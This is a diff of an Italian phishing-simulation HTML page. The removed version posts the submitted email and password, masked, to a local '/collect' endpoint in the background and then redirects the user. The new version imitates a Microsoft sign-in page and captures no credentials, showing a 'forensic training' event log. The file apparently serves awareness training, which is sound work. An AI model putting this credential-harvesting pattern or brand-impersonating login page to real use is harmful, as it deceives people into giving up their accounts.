@@ -1,101 +1,125 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-  <meta charset="UTF-8">
-  <title>Verifica sicurezza account</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      background:#f1f3f6;
-      font-family:Arial,sans-serif;
-    }
-    .box {
-      width:360px;
-      margin:120px auto;
-      background:#fff;
-      padding:30px;
-      border-radius:6px;
-      box-shadow:0 6px 18px rgba(0,0,0,.15);
-    }
-    input, button {
-      width:100%;
-      padding:10px;
-      margin-top:12px;
-    }
-    button {
-      background:#0b5ed7;
-      color:#fff;
-      border:none;
-    }
-    .hidden { display:none; }
+<meta charset="UTF-8">
+<title>Verifica account – Simulazione</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-    /* Vista attaccante */
-    .attacker {
-      width:600px;
-      margin:80px auto;
-      background:#111;
-      color:#0f0;
-      padding:20px;
-      font-family:monospace;
-      border-radius:6px;
-    }
-  </style>
+<style>
+body {
+  margin:0;
+  background:#f3f2f1;
+  font-family:"Segoe UI", Arial, sans-serif;
+}
+
+.box {
+  width:380px;
+  margin:100px auto;
+  background:#fff;
+  padding:32px;
+  box-shadow:0 2px 6px rgba(0,0,0,.2);
+}
+
+.logo {
+  font-size:20px;
+  font-weight:600;
+  margin-bottom:20px;
+}
+
+h2 {
+  font-size:24px;
+  font-weight:600;
+  margin:0 0 10px;
+}
+
+p {
+  color:#444;
+  font-size:14px;
+}
+
+input {
+  width:100%;
+  padding:10px;
+  margin-top:16px;
+  font-size:15px;
+}
+
+button {
+  width:100%;
+  padding:10px;
+  margin-top:20px;
+  background:#0067b8;
+  color:#fff;
+  border:none;
+  font-size:15px;
+  cursor:pointer;
+}
+
+.notice {
+  margin-top:20px;
+  font-size:12px;
+  color:#605e5c;
+  background:#fff4ce;
+  padding:10px;
+  border-left:4px solid #ffb900;
+}
+
+/* Vista forense */
+.attacker {
+  width:600px;
+  margin:60px auto;
+  background:#111;
+  color:#0f0;
+  padding:20px;
+  font-family:monospace;
+  border-radius:6px;
+}
+
+.hidden { display:none; }
+</style>
 </head>
+
 <body>
 
 <!-- VISTA UTENTE -->
 <div class="box" id="loginBox">
-  <h2>Conferma identità</h2>
-  <p>Per motivi di sicurezza è richiesta la verifica dell’account.</p>
+  <div class="logo">Microsoft</div>
 
-  <form onsubmit="return fakeLogin();">
-    <input type="email" id="email" placeholder="Email" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <button type="submit">Continua</button>
+  <h2>Accedi</h2>
+  <p>Per continuare è richiesta la verifica dell’account.</p>
+
+  <form onsubmit="return simulatedLogin();">
+    <input type="email" placeholder="Email, telefono o Skype" required>
+    <input type="password" placeholder="Password" required>
+    <button type="submit">Avanti</button>
   </form>
 </div>
 
-<!-- VISTA ATTACCANTE (nascosta) -->
+<!-- VISTA FORENSE / ANALISI -->
 <div class="attacker hidden" id="attackerView">
-  <h3>[ Attacker View – Simulazione ]</h3>
+  <h3>[ Forensic Training View ]</h3>
   <pre id="dump"></pre>
 </div>
 
 <script>
-function maskEmail(email) {
-  const [u, d] = email.split("@");
-  return u[0] + "****@" + d;
-}
-
-function maskPassword(password) {
-  return "*".repeat(password.length);
-}
-
-function fakeLogin() {
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
-
-  const payload = {
-    email: maskEmail(email),
-    password: maskPassword(password),
-    passwordLength: password.length,
-    timestamp: new Date().toISOString()
+function simulatedLogin() {
+  const eventLog = {
+    event: "login_attempt",
+    ui: "microsoft-style",
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    note: "No credentials captured (training mode)"
   };
 
-  /* POST reale in background */
-  fetch("http://localhost:3000/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  }).catch(() => {});
+  document.getElementById("loginBox").classList.add("hidden");
+  document.getElementById("attackerView").classList.remove("hidden");
 
-  /* REDIRECT VISIBILE ALL'UTENTE */
-  window.location.href = "verifica-completata.html";
+  document.getElementById("dump").textContent =
+    JSON.stringify(eventLog, null, 2);
 
   return false;
 }
 </script>
-
 
 </body>
 </html>
